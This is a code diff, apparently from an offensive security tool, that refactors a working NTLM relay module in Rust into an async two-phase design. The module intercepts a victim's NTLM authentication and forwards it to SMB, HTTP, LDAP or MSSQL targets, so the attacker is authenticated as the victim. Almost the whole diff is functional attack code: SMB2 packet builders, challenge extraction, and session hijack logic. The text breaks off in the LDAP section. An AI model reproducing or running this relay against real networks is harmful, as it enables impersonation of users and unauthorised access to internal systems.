@@ -7,21 +7,22 @@
 //!
 //! 1. Victim connects to our fake service (responder)
 //! 2. Victim sends NTLM NEGOTIATE
-//! 3. We forward NEGOTIATE to target
-//! 4. Target sends back CHALLENGE
-//! 5. We send same CHALLENGE to victim
-//! 6. Victim sends AUTHENTICATE with challenge response
-//! 7. We forward AUTHENTICATE to target
-//! 8. Target authenticates us as victim
+//! 3. We forward NEGOTIATE to target → get target's CHALLENGE
+//! 4. We send the target's CHALLENGE back to victim
+//! 5. Victim computes AUTHENTICATE against target's challenge
+//! 6. We forward AUTHENTICATE to target
+//! 7. Target authenticates us as victim
 //!
-//! This works because NTLM is a challenge-response protocol where
-//! the challenge comes from the server - we act as a man-in-the-middle.
+//! The relay is split into two phases because the victim needs
+//! the target's challenge before it can produce AUTHENTICATE.
 
 use crate::{Protocol, RelayError, RelayTarget, Result};
-use std::net::{TcpStream, SocketAddr};
-use std::io::{Read, Write};
-use std::time::Duration;
 use std::collections::HashMap;
+use std::net::SocketAddr;
+use std::sync::atomic::{AtomicU64, Ordering};
+use std::time::Duration;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
 use tracing::{debug, info, warn};
 
 // ═══════════════════════════════════════════════════════════
@@ -39,7 +40,7 @@ pub enum NtlmMessageType {
 }
 
 /// Parse NTLM message type from raw bytes
-fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
+pub fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
     if data.len() < 12 {
         return None;
     }
@@ -98,29 +99,48 @@ pub struct RelayStats {
 }
 
 // ═══════════════════════════════════════════════════════════
-// Active Relay Session
+// Two-Phase Relay State
 // ═══════════════════════════════════════════════════════════
 
-/// An active relayed session
-#[derive(Debug)]
-pub struct RelaySession {
+/// A pending relay connection that has completed Phase 1 (negotiate)
+/// and is waiting for Phase 2 (authenticate).
+pub struct PendingRelay {
+    /// Unique ID for this relay attempt
+    pub relay_id: u64,
+    /// Target we connected to
+    pub target: RelayTarget,
+    /// Async TCP stream to the target (kept alive between phases)
+    stream: TcpStream,
+    /// The NTLM challenge received from the target
+    pub challenge: Vec<u8>,
+    /// SMB2 session ID (needed for subsequent session setup)
+    smb_session_id: u64,
+    /// SMB2 message ID counter
+    smb_message_id: u64,
+}
+
+/// Result of a successful relay (Phase 2 complete)
+pub struct RelayedSession {
     pub target: RelayTarget,
     pub username: String,
     pub domain: String,
     pub stream: TcpStream,
-    pub authenticated: bool,
+    pub smb_session_id: u64,
 }
 
 // ═══════════════════════════════════════════════════════════
 // NTLM Relay Handler
 // ═══════════════════════════════════════════════════════════
 
-/// NTLM Relay handler
+/// NTLM Relay handler — fully async, two-phase architecture
 pub struct NtlmRelay {
     config: RelayConfig,
     running: bool,
     stats: RelayStats,
-    sessions: Vec<RelaySession>,
+    pending: HashMap<u64, PendingRelay>,
+    next_id: AtomicU64,
+    /// Target round-robin index
+    target_idx: usize,
 }
 
 impl NtlmRelay {
@@ -130,7 +150,9 @@ impl NtlmRelay {
             config,
             running: false,
             stats: RelayStats::default(),
-            sessions: Vec::new(),
+            pending: HashMap::new(),
+            next_id: AtomicU64::new(1),
+            target_idx: 0,
         }
     }
 
@@ -163,15 +185,11 @@ impl NtlmRelay {
             return Ok(());
         }
 
-        info!("Stopping NTLM relay");
-        
-        // Close all active sessions
-        for session in self.sessions.drain(..) {
-            debug!("Closing session for {}\\{} to {}", 
-                session.domain, session.username, session.target.address);
-            // Stream will be closed on drop
-        }
-        
+        info!(
+            "Stopping NTLM relay — dropping {} pending relays",
+            self.pending.len()
+        );
+        self.pending.clear();
         self.running = false;
         info!("NTLM relay stopped");
         Ok(())
@@ -192,11 +210,6 @@ impl NtlmRelay {
         &self.config
     }
 
-    /// Get active sessions
-    pub fn get_sessions(&mut self) -> &mut Vec<RelaySession> {
-        &mut self.sessions
-    }
-
     /// Add a target
     pub fn add_target(&mut self, target: RelayTarget) {
         self.config.targets.push(target);
@@ -207,318 +220,363 @@ impl NtlmRelay {
         self.config.targets.retain(|t| &t.address != addr);
     }
 
+    /// Pick the next target (round-robin)
+    fn next_target(&mut self) -> Option<RelayTarget> {
+        if self.config.targets.is_empty() {
+            return None;
+        }
+        let target = self.config.targets[self.target_idx % self.config.targets.len()].clone();
+        self.target_idx = self.target_idx.wrapping_add(1);
+        Some(target)
+    }
+
     // ─────────────────────────────────────────────────────────
-    // Core Relay Logic
+    // Phase 1: Forward NEGOTIATE → get CHALLENGE
     // ─────────────────────────────────────────────────────────
 
-    /// Relay NTLM authentication to a target
-    /// 
-    /// This is the main entry point for relaying. It:
-    /// 1. Picks a target from the target list
-    /// 2. Connects to the target
-    /// 3. Performs the NTLM handshake via protocol-specific messages
-    /// 4. Returns an authenticated session
-    pub fn relay_authentication(
-        &mut self,
-        ntlm_negotiate: &[u8],
-        ntlm_authenticate: &[u8],
-        client_info: Option<&str>,
-    ) -> Result<Option<RelaySession>> {
-        if self.config.targets.is_empty() {
-            debug!("No targets available for relay");
-            return Ok(None);
-        }
+    /// Phase 1 of NTLM relay.
+    ///
+    /// Connects to the next available target, forwards the victim's
+    /// NEGOTIATE message, and returns the target's CHALLENGE.
+    ///
+    /// The caller (responder) must send this CHALLENGE back to the
+    /// victim, then call `relay_authenticate()` with the victim's
+    /// AUTHENTICATE response.
+    pub async fn relay_negotiate(&mut self, ntlm_negotiate: &[u8]) -> Result<(u64, Vec<u8>)> {
+        let target = self
+            .next_target()
+            .ok_or_else(|| RelayError::Config("No relay targets available".into()))?;
 
         self.stats.total_attempts += 1;
 
-        // Try each target until one succeeds
-        let mut last_error = None;
-        
-        for target in self.config.targets.clone() {
-            debug!(
-                "Attempting relay to {}://{}{}",
-                target.protocol,
-                target.address,
-                client_info.map(|c| format!(" (from {})", c)).unwrap_or_default()
-            );
+        debug!(
+            "Phase 1: connecting to {}://{}",
+            target.protocol, target.address
+        );
 
-            match self.relay_to_target(&target, ntlm_negotiate, ntlm_authenticate) {
-                Ok(session) => {
-                    info!(
-                        "✓ Successfully relayed to {}://{} as {}\\{}",
-                        target.protocol,
-                        target.address,
-                        session.domain,
-                        session.username
-                    );
+        let timeout = Duration::from_secs(self.config.timeout_secs);
 
-                    self.stats.successful_relays += 1;
-                    *self.stats.by_protocol
-                        .entry(target.protocol.to_string())
-                        .or_insert(0) += 1;
+        match target.protocol {
+            Protocol::Smb => {
+                let (stream, challenge, session_id, msg_id) = self
+                    .smb_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                    .await?;
 
-                    let session = RelaySession {
+                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                info!(
+                    "Phase 1 complete → relay_id={}, target={}://{}",
+                    relay_id, target.protocol, target.address
+                );
+
+                self.pending.insert(
+                    relay_id,
+                    PendingRelay {
+                        relay_id,
                         target,
-                        username: session.username,
-                        domain: session.domain,
-                        stream: session.stream,
-                        authenticated: true,
-                    };
+                        stream,
+                        challenge: challenge.clone(),
+                        smb_session_id: session_id,
+                        smb_message_id: msg_id,
+                    },
+                );
 
-                    self.sessions.push(session);
-                    // Return a reference to the last session (we can't return the mutable ref)
-                    return Ok(None); // Session is stored, caller can use get_sessions()
-                }
-                Err(e) => {
-                    debug!("Relay to {} failed: {}", target.address, e);
-                    last_error = Some(e);
-                }
+                Ok((relay_id, challenge))
+            }
+            Protocol::Http | Protocol::Https => {
+                let (stream, challenge) = self
+                    .http_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                    .await?;
+
+                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                self.pending.insert(
+                    relay_id,
+                    PendingRelay {
+                        relay_id,
+                        target,
+                        stream,
+                        challenge: challenge.clone(),
+                        smb_session_id: 0,
+                        smb_message_id: 0,
+                    },
+                );
+
+                Ok((relay_id, challenge))
+            }
+            Protocol::Ldap | Protocol::Ldaps => {
+                let (stream, challenge) = self
+                    .ldap_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                    .await?;
+
+                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                self.pending.insert(
+                    relay_id,
+                    PendingRelay {
+                        relay_id,
+                        target,
+                        stream,
+                        challenge: challenge.clone(),
+                        smb_session_id: 0,
+                        smb_message_id: 0,
+                    },
+                );
+
+                Ok((relay_id, challenge))
+            }
+            Protocol::Mssql => {
+                let (stream, challenge) = self
+                    .mssql_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
+                    .await?;
+
+                let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
+
+                self.pending.insert(
+                    relay_id,
+                    PendingRelay {
+                        relay_id,
+                        target,
+                        stream,
+                        challenge: challenge.clone(),
+                        smb_session_id: 0,
+                        smb_message_id: 0,
+                    },
+                );
+
+                Ok((relay_id, challenge))
             }
         }
-
-        self.stats.failed_relays += 1;
-        if let Some(e) = last_error {
-            warn!("All relay targets failed: {}", e);
-            Err(e)
-        } else {
-            Ok(None)
-        }
-    }
-
-    /// Relay to a specific target
-    fn relay_to_target(
-        &self,
-        target: &RelayTarget,
-        ntlm_negotiate: &[u8],
-        ntlm_authenticate: &[u8],
-    ) -> Result<RelayedSession> {
-        match target.protocol {
-            Protocol::Smb => self.relay_smb(target, ntlm_negotiate, ntlm_authenticate),
-            Protocol::Http | Protocol::Https => self.relay_http(target, ntlm_negotiate, ntlm_authenticate),
-            Protocol::Ldap | Protocol::Ldaps => self.relay_ldap(target, ntlm_negotiate, ntlm_authenticate),
-            Protocol::Mssql => self.relay_mssql(target, ntlm_negotiate, ntlm_authenticate),
-        }
     }
 
     // ─────────────────────────────────────────────────────────
-    // SMB Relay Implementation
+    // Phase 2: Forward AUTHENTICATE → get session
     // ─────────────────────────────────────────────────────────
 
-    /// Relay to SMB target
-    fn relay_smb(
+    /// Phase 2 of NTLM relay.
+    ///
+    /// Takes the relay_id from Phase 1 and the victim's AUTHENTICATE
+    /// message (computed against the target's challenge), forwards it
+    /// to the target, and returns the authenticated session.
+    pub async fn relay_authenticate(
+        &mut self,
+        relay_id: u64,
+        ntlm_authenticate: &[u8],
+    ) -> Result<RelayedSession> {
+        let mut pending = self.pending.remove(&relay_id).ok_or_else(|| {
+            RelayError::Protocol(format!("No pending relay with id {}", relay_id))
+        })?;
+
+        let (username, domain) = parse_ntlm_authenticate_info(ntlm_authenticate)?;
+
+        debug!(
+            "Phase 2: authenticating {}\\{} to {}://{}",
+            domain, username, pending.target.protocol, pending.target.address
+        );
+
+        let result = match pending.target.protocol {
+            Protocol::Smb => {
+                self.smb_session_setup_auth(
+                    &mut pending.stream,
+                    ntlm_authenticate,
+                    pending.smb_session_id,
+                    pending.smb_message_id,
+                )
+                .await
+            }
+            Protocol::Http | Protocol::Https => {
+                self.http_authenticate(&mut pending.stream, ntlm_authenticate, &pending.target)
+                    .await
+            }
+            Protocol::Ldap | Protocol::Ldaps => {
+                self.ldap_authenticate(&mut pending.stream, ntlm_authenticate)
+                    .await
+            }
+            Protocol::Mssql => {
+                self.mssql_authenticate(&mut pending.stream, ntlm_authenticate)
+                    .await
+            }
+        };
+
+        match result {
+            Ok(()) => {
+                info!(
+                    "✓ Relay successful: {}\\{} → {}://{}",
+                    domain, username, pending.target.protocol, pending.target.address
+                );
+
+                self.stats.successful_relays += 1;
+                *self
+                    .stats
+                    .by_protocol
+                    .entry(pending.target.protocol.to_string())
+                    .or_insert(0) += 1;
+
+                if self.config.remove_on_success {
+                    let addr = pending.target.address;
+                    self.config.targets.retain(|t| t.address != addr);
+                }
+
+                Ok(RelayedSession {
+                    target: pending.target,
+                    username,
+                    domain,
+                    stream: pending.stream,
+                    smb_session_id: pending.smb_session_id,
+                })
+            }
+            Err(e) => {
+                self.stats.failed_relays += 1;
+                warn!(
+                    "✗ Relay failed: {}\\{} → {}: {}",
+                    domain, username, pending.target.address, e
+                );
+                Err(e)
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // SMB Relay — Phase 1
+    // ═══════════════════════════════════════════════════════════
+
+    /// Connect to SMB target, do SMB2 negotiate, then session setup
+    /// with the victim's NTLM negotiate. Returns (stream, challenge, session_id, msg_id).
+    async fn smb_negotiate_and_challenge(
         &self,
         target: &RelayTarget,
         ntlm_negotiate: &[u8],
-        ntlm_authenticate: &[u8],
-    ) -> Result<RelayedSession> {
-        info!("Relaying to SMB target: {}", target.address);
-
-        // Connect to target
-        let mut stream = TcpStream::connect_timeout(
-            &target.address,
-            Duration::from_secs(self.config.timeout_secs)
-        ).map_err(|e| RelayError::Connection(format!(
-            "Failed to connect to {}: {}", target.address, e
-        )))?;
-
-        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
-        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
+        timeout: Duration,
+    ) -> Result<(TcpStream, Vec<u8>, u64, u64)> {
+        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
+            .await
+            .map_err(|_| {
+                RelayError::Connection(format!("Timeout connecting to {}", target.address))
+            })?
+            .map_err(|e| {
+                RelayError::Connection(format!("SMB connect to {}: {}", target.address, e))
+            })?;
 
         let mut buf = vec![0u8; 65536];
+        let mut msg_id: u64 = 0;
 
-        // Step 1: Receive SMB NEGOTIATE request from client
-        // Step 2: Forward to target as SMB2 NEGOTIATE
-        
-        // Send SMB2 Negotiate
-        let smb_negotiate = self.build_smb2_negotiate();
-        stream.write_all(&smb_negotiate)
-            .map_err(|e| RelayError::Network(format!("SMB negotiate write failed: {}", e)))?;
+        // ── SMB2 NEGOTIATE ──
+        let smb_negotiate = build_smb2_negotiate(msg_id);
+        msg_id += 1;
+        stream
+            .write_all(&smb_negotiate)
+            .await
+            .map_err(|e| RelayError::Network(format!("SMB negotiate write: {}", e)))?;
 
-        // Read negotiate response
-        let len = stream.read(&mut buf)
-            .map_err(|e| RelayError::Network(format!("SMB negotiate read failed: {}", e)))?;
+        let len = stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("SMB negotiate read: {}", e)))?;
 
-        if len < 64 {
-            return Err(RelayError::Protocol("SMB negotiate response too short".into()).into());
+        if len < 68 || &buf[4..8] != b"\xfeSMB" {
+            return Err(RelayError::Protocol("Invalid SMB2 negotiate response".into()).into());
         }
 
-        // Verify SMB2 header
-        if &buf[4..8] != b"\xfeSMB" {
-            return Err(RelayError::Protocol("Invalid SMB2 response".into()).into());
+        debug!("SMB2 negotiate OK with {}", target.address);
+
+        // ── SESSION_SETUP with NTLM NEGOTIATE ──
+        let session_setup = build_smb2_session_setup(ntlm_negotiate, 0, msg_id);
+        msg_id += 1;
+        stream
+            .write_all(&session_setup)
+            .await
+            .map_err(|e| RelayError::Network(format!("Session setup write: {}", e)))?;
+
+        let len = stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("Session setup read: {}", e)))?;
+
+        if len < 68 {
+            return Err(RelayError::Protocol("Session setup response too short".into()).into());
         }
 
-        debug!("SMB2 negotiate successful with {}", target.address);
+        // Check status — STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
+        let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
+        if status != 0xC0000016 {
+            return Err(RelayError::Protocol(format!(
+                "Expected STATUS_MORE_PROCESSING_REQUIRED, got 0x{:08X}",
+                status
+            ))
+            .into());
+        }
 
-        // Step 3: Send SESSION_SETUP with NTLM NEGOTIATE
-        let session_setup = self.build_smb2_session_setup(ntlm_negotiate);
-        stream.write_all(&session_setup)
-            .map_err(|e| RelayError::Network(format!("Session setup write failed: {}", e)))?;
+        // Extract session ID (8 bytes at offset 44)
+        let session_id = u64::from_le_bytes([
+            buf[44], buf[45], buf[46], buf[47], buf[48], buf[49], buf[50], buf[51],
+        ]);
 
-        // Step 4: Read SESSION_SETUP response with NTLM CHALLENGE
-        let len = stream.read(&mut buf)
-            .map_err(|e| RelayError::Network(format!("Session setup read failed: {}", e)))?;
+        // Extract NTLM challenge from security buffer
+        let challenge = extract_ntlm_from_smb2(&buf[..len])?;
 
-        // Extract the challenge from the response
-        let _challenge = self.extract_ntlm_challenge_from_smb(&buf[..len])?;
+        debug!(
+            "Got NTLM challenge from {}, session_id=0x{:016X}",
+            target.address, session_id
+        );
 
-        debug!("Received NTLM challenge from {}", target.address);
+        Ok((stream, challenge, session_id, msg_id))
+    }
 
-        // Step 5: Send SESSION_SETUP with NTLM AUTHENTICATE
-        // Note: We use the authenticate message from the victim
-        let session_setup_auth = self.build_smb2_session_setup(ntlm_authenticate);
-        stream.write_all(&session_setup_auth)
-            .map_err(|e| RelayError::Network(format!("Session setup auth write failed: {}", e)))?;
+    // ═══════════════════════════════════════════════════════════
+    // SMB Relay — Phase 2
+    // ═══════════════════════════════════════════════════════════
 
-        // Step 6: Read final response
-        let _len = stream.read(&mut buf)
-            .map_err(|e| RelayError::Network(format!("Session setup auth read failed: {}", e)))?;
+    async fn smb_session_setup_auth(
+        &self,
+        stream: &mut TcpStream,
+        ntlm_authenticate: &[u8],
+        session_id: u64,
+        msg_id: u64,
+    ) -> Result<()> {
+        let pdu = build_smb2_session_setup(ntlm_authenticate, session_id, msg_id);
+        stream
+            .write_all(&pdu)
+            .await
+            .map_err(|e| RelayError::Network(format!("Session auth write: {}", e)))?;
 
-        // Check if authentication succeeded
-        let status = u32::from_le_bytes([buf[8], buf[9], buf[10], buf[11]]);
-        
+        let mut buf = vec![0u8; 65536];
+        let len = stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("Session auth read: {}", e)))?;
+
+        if len < 12 {
+            return Err(RelayError::Protocol("Auth response too short".into()).into());
+        }
+
+        let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
         if status == 0 {
-            // Extract username/domain from NTLM authenticate
-            let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
-            
-            info!("SMB relay successful: {}\\{} -> {}", domain, username, target.address);
-            
-            Ok(RelayedSession {
-                stream,
-                username,
-                domain,
-            })
+            Ok(())
         } else {
-            Err(RelayError::Authentication(format!(
-                "SMB authentication failed with status 0x{:08X}", status
-            )).into())
+            Err(
+                RelayError::Authentication(format!("SMB auth failed: NT_STATUS 0x{:08X}", status))
+                    .into(),
+            )
         }
     }
 
-    /// Build SMB2 Negotiate message
-    fn build_smb2_negotiate(&self) -> Vec<u8> {
-        let mut msg = Vec::new();
+    // ═══════════════════════════════════════════════════════════
+    // HTTP Relay — Phase 1 & 2
+    // ═══════════════════════════════════════════════════════════
 
-        // NetBIOS header (will update length later)
-        msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-
-        // SMB2 header
-        msg.extend_from_slice(b"\xfeSMB");           // Protocol ID
-        msg.extend_from_slice(&0x40u16.to_le_bytes()); // Header length (64)
-        msg.extend_from_slice(&0x001Fu16.to_le_bytes()); // Credit charge
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Status
-        msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Command (NEGOTIATE)
-        msg.extend_from_slice(&0x001Fu16.to_le_bytes()); // Credits
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Flags
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Next command
-        msg.extend_from_slice(&0u64.to_le_bytes());   // Message ID
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Reserved
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Tree ID
-        msg.extend_from_slice(&[0u8; 16]);            // Session ID
-        msg.extend_from_slice(&[0u8; 16]);            // Signature
-
-        // Negotiate request
-        msg.extend_from_slice(&0x24u16.to_le_bytes()); // Structure size (36)
-        msg.extend_from_slice(&0x02u16.to_le_bytes()); // Dialect count (2)
-        msg.extend_from_slice(&0u16.to_le_bytes());    // Security mode
-        msg.extend_from_slice(&0u16.to_le_bytes());    // Reserved
-        msg.extend_from_slice(&0u32.to_le_bytes());    // Capabilities
-        
-        // Dialects: 0x0202 (SMB 2.0.2) and 0x0210 (SMB 2.1)
-        msg.extend_from_slice(&0x0202u16.to_le_bytes());
-        msg.extend_from_slice(&0x0210u16.to_le_bytes());
-
-        // Update NetBIOS length
-        let len = msg.len() - 4;
-        msg[1] = ((len >> 16) & 0xFF) as u8;
-        msg[2] = ((len >> 8) & 0xFF) as u8;
-        msg[3] = (len & 0xFF) as u8;
-
-        msg
-    }
-
-    /// Build SMB2 SESSION_SETUP message with NTLM
-    fn build_smb2_session_setup(&self, ntlm_data: &[u8]) -> Vec<u8> {
-        let mut msg = Vec::new();
-
-        // NetBIOS header (will update length later)
-        msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-
-        // SMB2 header
-        msg.extend_from_slice(b"\xfeSMB");           // Protocol ID
-        msg.extend_from_slice(&0x40u16.to_le_bytes()); // Header length (64)
-        msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Credit charge
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Status
-        msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Command (SESSION_SETUP)
-        msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Credits
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Flags
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Next command
-        msg.extend_from_slice(&1u64.to_le_bytes());   // Message ID
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Reserved
-        msg.extend_from_slice(&0u32.to_le_bytes());   // Tree ID
-        msg.extend_from_slice(&[0u8; 16]);            // Session ID
-        msg.extend_from_slice(&[0u8; 16]);            // Signature
-
-        // SESSION_SETUP request
-        let security_buffer_offset = 80u16; // After header + session setup header
-        msg.extend_from_slice(&0x19u16.to_le_bytes()); // Structure size (25)
-        msg.extend_from_slice(&0x00u16.to_le_bytes()); // Flags
-        msg.extend_from_slice(&0u32.to_le_bytes());    // Security mode
-        msg.extend_from_slice(&0u32.to_le_bytes());    // Capabilities
-        msg.extend_from_slice(&0u32.to_le_bytes());    // Channel
-        msg.extend_from_slice(&security_buffer_offset.to_le_bytes()); // Security buffer offset
-        msg.extend_from_slice(&(ntlm_data.len() as u16).to_le_bytes()); // Security buffer length
-        msg.extend_from_slice(&0x40u16.to_le_bytes()); // Previous session ID
-
-        // NTLM data
-        msg.extend_from_slice(ntlm_data);
-
-        // Update NetBIOS length
-        let len = msg.len() - 4;
-        msg[1] = ((len >> 16) & 0xFF) as u8;
-        msg[2] = ((len >> 8) & 0xFF) as u8;
-        msg[3] = (len & 0xFF) as u8;
-
-        msg
-    }
-
-    /// Extract NTLM challenge from SMB2 response
-    fn extract_ntlm_challenge_from_smb(&self, data: &[u8]) -> Result<Vec<u8>> {
-        // Find NTLMSSP signature
-        for i in 0..data.len().saturating_sub(8) {
-            if &data[i..i+8] == NTLM_SIGNATURE
-                && parse_ntlm_type(&data[i..]) == Some(NtlmMessageType::Challenge) {
-                    // Return the full challenge message
-                    return Ok(data[i..].to_vec());
-                }
-        }
-        Err(RelayError::Protocol("No NTLM challenge found in SMB response".into()).into())
-    }
-
-    // ─────────────────────────────────────────────────────────
-    // HTTP Relay Implementation
-    // ─────────────────────────────────────────────────────────
-
-    /// Relay to HTTP/HTTPS target
-    fn relay_http(
+    async fn http_negotiate_and_challenge(
         &self,
         target: &RelayTarget,
         ntlm_negotiate: &[u8],
-        ntlm_authenticate: &[u8],
-    ) -> Result<RelayedSession> {
-        info!("Relaying to HTTP target: {}", target.address);
+        timeout: Duration,
+    ) -> Result<(TcpStream, Vec<u8>)> {
+        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
+            .await
+            .map_err(|_| {
+                RelayError::Connection(format!("Timeout connecting to {}", target.address))
+            })?
+            .map_err(|e| RelayError::Connection(format!("HTTP connect: {}", e)))?;
 
-        // Connect to target
-        let mut stream = TcpStream::connect_timeout(
-            &target.address,
-            Duration::from_secs(self.config.timeout_secs)
-        ).map_err(|e| RelayError::Connection(format!(
-            "Failed to connect to {}: {}", target.address, e
-        )))?;
-
-        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
-        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
-
-        // Step 1: Send request with NTLM NEGOTIATE
         let negotiate_b64 = base64_encode(ntlm_negotiate);
         let request = format!(
             "GET / HTTP/1.1\r\n\
@@ -530,30 +588,45 @@ impl NtlmRelay {
             negotiate_b64
         );
 
-        stream.write_all(request.as_bytes())
-            .map_err(|e| RelayError::Network(format!("HTTP write failed: {}", e)))?;
+        stream
+            .write_all(request.as_bytes())
+            .await
+            .map_err(|e| RelayError::Network(format!("HTTP negotiate write: {}", e)))?;
 
-        // Step 2: Read response with NTLM CHALLENGE
-        let mut response = vec![0u8; 8192];
-        let len = stream.read(&mut response)
-            .map_err(|e| RelayError::Network(format!("HTTP read failed: {}", e)))?;
+        let mut response = vec![0u8; 16384];
+        let len = stream
+            .read(&mut response)
+            .await
+            .map_err(|e| RelayError::Network(format!("HTTP negotiate read: {}", e)))?;
+
         let response_str = String::from_utf8_lossy(&response[..len]);
 
-        // Extract challenge from WWW-Authenticate header
+        // Must be 401 with WWW-Authenticate: NTLM <challenge>
         let challenge_b64 = response_str
             .lines()
-            .find(|l| l.starts_with("WWW-Authenticate: NTLM "))
-            .map(|l| l.trim_start_matches("WWW-Authenticate: NTLM "))
-            .ok_or_else(|| RelayError::Protocol("No NTLM challenge in HTTP response".into()))?;
+            .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
+            .and_then(|l| l.splitn(3, ' ').nth(2))
+            .ok_or_else(|| RelayError::Protocol("No NTLM challenge in HTTP 401".into()))?;
 
-        let _challenge = base64_decode(challenge_b64)
-            .ok_or_else(|| RelayError::Protocol("Invalid base64 in challenge".into()))?;
+        let challenge = base64_decode(challenge_b64.trim())
+            .ok_or_else(|| RelayError::Protocol("Invalid base64 in HTTP challenge".into()))?;
 
-        debug!("Received HTTP NTLM challenge from {}", target.address);
+        if parse_ntlm_type(&challenge) != Some(NtlmMessageType::Challenge) {
+            return Err(RelayError::Protocol("HTTP response is not NTLM challenge".into()).into());
+        }
 
-        // Step 3: Send request with NTLM AUTHENTICATE
+        debug!("Got NTLM challenge from HTTP {}", target.address);
+        Ok((stream, challenge))
+    }
+
+    async fn http_authenticate(
+        &self,
+        stream: &mut TcpStream,
+        ntlm_authenticate: &[u8],
+        target: &RelayTarget,
+    ) -> Result<()> {
         let auth_b64 = base64_encode(ntlm_authenticate);
-        let auth_request = format!(
+        let request = format!(
             "GET / HTTP/1.1\r\n\
              Host: {}\r\n\
              Authorization: NTLM {}\r\n\
@@ -563,446 +636,754 @@ impl NtlmRelay {
             auth_b64
         );
 
-        stream.write_all(auth_request.as_bytes())
-            .map_err(|e| RelayError::Network(format!("HTTP auth write failed: {}", e)))?;
+        stream
+            .write_all(request.as_bytes())
+            .await
+            .map_err(|e| RelayError::Network(format!("HTTP auth write: {}", e)))?;
 
-        // Step 4: Read response
-        let len = stream.read(&mut response)
-            .map_err(|e| RelayError::Network(format!("HTTP auth read failed: {}", e)))?;
+        let mut response = vec![0u8; 16384];
+        let len = stream
+            .read(&mut response)
+            .await
+            .map_err(|e| RelayError::Network(format!("HTTP auth read: {}", e)))?;
+
         let response_str = String::from_utf8_lossy(&response[..len]);
 
-        // Check for success (200 OK or 401 with more data)
-        if response_str.contains("HTTP/1.1 200") || response_str.contains("HTTP/1.1 401") {
-            let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
-            
-            info!("HTTP relay successful: {}\\{} -> {}", domain, username, target.address);
-            
-            Ok(RelayedSession {
-                stream,
-                username,
-                domain,
-            })
+        // Only 200 OK means success — 401 means auth FAILED
+        if response_str.starts_with("HTTP/1.1 200") || response_str.starts_with("HTTP/1.0 200") {
+            Ok(())
         } else {
-            Err(RelayError::Authentication("HTTP relay failed".into()).into())
+            let status_line = response_str.lines().next().unwrap_or("(empty)");
+            Err(RelayError::Authentication(format!("HTTP auth failed: {}", status_line)).into())
         }
     }
 
-    // ─────────────────────────────────────────────────────────
-    // LDAP Relay Implementation
-    // ─────────────────────────────────────────────────────────
+    // ═══════════════════════════════════════════════════════════
+    // LDAP Relay — Phase 1 & 2
+    // ═══════════════════════════════════════════════════════════
 
-    /// Relay to LDAP/LDAPS target
-    fn relay_ldap(
+    async fn ldap_negotiate_and_challenge(
         &self,
         target: &RelayTarget,
         ntlm_negotiate: &[u8],
-        ntlm_authenticate: &[u8],
-    ) -> Result<RelayedSession> {
-        info!("Relaying to LDAP target: {}", target.address);
+        timeout: Duration,
+    ) -> Result<(TcpStream, Vec<u8>)> {
+        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
+            .await
+            .map_err(|_| {
+                RelayError::Connection(format!("Timeout connecting to {}", target.address))
+            })?
+            .map_err(|e| RelayError::Connection(format!("LDAP connect: {}", e)))?;
 
-        // Connect to target
-        let mut stream = TcpStream::connect_timeout(
-            &target.address,
-            Duration::from_secs(self.config.timeout_secs)
-        ).map_err(|e| RelayError::Connection(format!(
-            "Failed to connect to {}: {}", target.address, e
-        )))?;
+        // LDAP SASL bind with GSS-SPNEGO wrapping NTLM negotiate
+        let bind_req = build_ldap_sasl_bind(ntlm_negotiate, 1);
+        stream
+            .write_all(&bind_req)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP negotiate write: {}", e)))?;
 
-        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
-        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
+        let mut response = vec![0u8; 16384];
+        let len = stream
+            .read(&mut response)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP negotiate read: {}", e)))?;
 
-        // LDAP uses SASL bind with NTLM
